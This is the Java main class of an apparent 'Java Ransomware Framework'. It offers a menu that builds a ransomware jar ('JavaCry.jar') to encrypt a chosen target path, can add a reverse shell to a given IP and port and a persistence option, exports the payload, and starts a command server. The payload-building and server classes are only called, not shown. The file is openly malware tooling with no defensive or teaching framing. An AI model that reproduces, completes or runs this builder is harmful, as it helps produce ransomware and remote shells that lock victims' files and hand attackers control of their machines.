import java.util.Scanner;
import java.io.File;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;


public class JRF {
    public static void main(String[] args) {
        Scanner input = new Scanner(System.in);

        System.out.println("Java Ransomware Framework");
        
        while (true) {
            System.out.println("\nOptions:");
            System.out.println("1) Generate ransomware");
            System.out.println("2) Open main server");
            System.out.println("3) Quit");
            System.out.print("\nWhat do you want to do?: ");
            String action = input.nextLine();
            if (action.equals("1")) {
                System.out.print("Insert target path for encryption: ");
                String path = input.nextLine();
                System.out.print("Insert local ip address: ");
                String IP = input.nextLine();
                System.out.print("Would you like to use a reverse shell? (y/n): ");
                boolean useRevShell = (input.nextLine().toLowerCase().equals("y"));
                // input.nextLine();
                boolean usePersistence = false;
                int port = 0;
                if (useRevShell){
                    System.out.print("Insert port number to run the shell listener (6666, 5555 are used for JRF services): ");
                    port = input.nextInt();
                    System.out.print("Would you like to let the ransomware try for persistence? (y/n): ");
                    input.nextLine();
                    usePersistence = (input.nextLine().toLowerCase().equals("y"));
                }

                PayloadBuilder builder = new PayloadBuilder(path, useRevShell, usePersistence, IP, port);
                builder.build();
                builder.compile();
                System.out.println("Ransomware generated!");

                // String[] envp = {"HOME=" + System.getProperty("user.home")};

                System.out.print("Please specify export path: ");
                String pth = input.nextLine();
                try {
                    Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(pth, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {
                    System.out.println(e);
                }
                
                System.out.print("Would you like to open the main server? (y/n): ");
                boolean openMainServer = (input.nextLine().toLowerCase().equals("y"));
                if (openMainServer) {
                    System.out.println("Opening up servers");
                    MainServer server = new MainServer();
                    server.start();
                }
            } else if (action.equals("2")) {
                System.out.println("Opening up servers");
                    MainServer server = new MainServer();
                    server.start();
            } else if (action.equals("3")) {
                return;
            } else {
                System.out.println("Invalid option \"" + action + "\"");
            }
        }
        
        

    }
}
